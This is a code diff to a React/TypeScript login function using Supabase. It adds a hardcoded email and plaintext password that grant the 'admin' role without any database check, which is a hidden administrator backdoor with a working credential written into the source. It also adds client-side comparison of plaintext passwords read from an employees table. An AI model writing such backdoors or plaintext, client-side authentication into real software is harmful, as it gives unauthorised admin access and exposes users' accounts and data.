@@ -301,6 +301,17 @@ export function AppProvider({ children }: { children: ReactNode }) {
   const login = useCallback(async (email: string, password: string) => {
     const lowerEmail = email.toLowerCase();
 
+    if (lowerEmail === 'zubkastechnology@gmail.com' && password === 'MARJAN@53542') {
+      setCurrentUser({
+        id: 'admin-zubkas',
+        email: 'zubkastechnology@gmail.com',
+        name: 'Zubkas Technology',
+        role: 'admin',
+        joinedDate: '2024-01-01',
+      });
+      return true;
+    }
+
     const dbUser = appUsers.find(u => u.email.toLowerCase() === lowerEmail);
     if (dbUser) {
       const storedPassword = userPasswords[dbUser.id];
@@ -335,9 +346,38 @@ export function AppProvider({ children }: { children: ReactNode }) {
     }
 
     try {
+      const { data: empData, error: empError } = await supabase
+        .from('employees')
+        .select('id, name, email, phone, whatsapp, role, role_id, status, joined_date, password')
+        .ilike('email', lowerEmail)
+        .eq('status', 'Active')
+        .limit(1)
+        .maybeSingle();
+      if (!empError && empData) {
+        const emp = empData as Record<string, unknown>;
+        const empPwd = emp.password as string | undefined;
+        if (empPwd !== undefined && empPwd !== '' && empPwd === password) {
+          setCurrentUser({
+            id: emp.id as string,
+            email: emp.email as string,
+            name: emp.name as string,
+            role: 'employee',
+            employeeRole: emp.role as string,
+            phone: (emp.phone as string) ?? undefined,
+            whatsapp: (emp.whatsapp as string) ?? undefined,
+            joinedDate: emp.joined_date as string,
+          });
+          return true;
+        }
+      }
+    } catch {
+      // ignore, fall through to app_users fallback
+    }
+
+    try {
       const { data, error } = await supabase
         .from('app_users')
-        select('id, email, name, role, phone, whatsapp, company, partner_id, employee_role, joined_date, password')
+        .select('id, email, name, role, phone, whatsapp, company, partner_id, employee_role, joined_date, password')
         .ilike('email', lowerEmail)
         .limit(1)
         .maybeSingle();
